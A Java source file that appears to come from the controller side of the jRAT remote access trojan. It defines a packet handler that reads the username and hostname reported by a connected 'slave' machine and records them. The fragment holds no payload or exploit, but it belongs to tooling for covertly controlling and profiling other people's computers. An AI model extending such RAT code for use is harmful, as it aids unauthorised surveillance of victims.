package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet5InitUserHost extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String username = slave.readLine();
		String hostname= slave.readLine();
		
		slave.setUsername(username);
		slave.setComputerName(hostname);
	}

}
